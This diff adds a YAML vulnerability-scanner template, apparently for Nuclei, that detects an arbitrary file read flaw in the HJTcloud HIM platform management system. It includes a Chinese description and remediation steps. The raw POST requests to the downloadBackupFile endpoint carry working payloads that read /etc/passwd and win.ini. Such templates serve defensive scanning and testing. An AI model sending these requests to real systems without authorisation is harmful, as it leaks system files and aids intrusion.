@@ -1,0 +1,48 @@
+id: hjtcloud-arbitrary-file-read
+info:
+  name: HJTcloud Arbitrary File Read
+  author:
+  - l0ne1y
+  description: |-
+    中创视讯HIM基础平台管理系统文件读取
+    北京中创视讯科技有限公司是一家专注于视频会议系统软硬件研发的高科技公司。
+
+    北京中创视讯科技有限公司HIM基础平台管理系统存在信息泄露漏洞，攻击者可利用该漏洞获取敏感信息。
+  severity: medium
+  remediation: |-
+    官方修复方案：
+    1、建议用户到官方获取最新补丁或者最新版本程序：
+    http://www.hjtcloud.com
+
+    临时修复方案：
+    1、过滤\".\"，使用户在url中不能回溯上级目录。
+    2、正则匹配严格判断用户输入参数的格式，对用户传过来的文件名参数进行硬编码或统一编码，对文件类型进行白名单控制，对包含恶意字符或者空字符的参数进行拒绝。
+    3、禁止系统提供目录遍历服务，如：php.ini配置open_basedir限定文件访问范围。
+    4、文件路径保存至数据库，让用户提交文件对应ID下载文件。
+    5、用户下载文件之前进行权限校验。
+requests:
+- matchers:
+  - type: regex
+    condition: or
+    regex:
+    - 'root:.*:0:0:'
+    - bit app support
+  - type: status
+    status:
+    - 200
+  matchers-condition: and
+  raw:
+  - |
+    POST /fileDownload?action=downloadBackupFile HTTP/1.1
+    Host: {{Hostname}}
+    Accept: application/json, text/plain, */*
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    fullPath=/etc/passwd
+  - |
+    POST /fileDownload?action=downloadBackupFile HTTP/1.1
+    Host: {{Hostname}}
+    Accept: application/json, text/plain, */*
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    fullPath=/Windows/win.ini
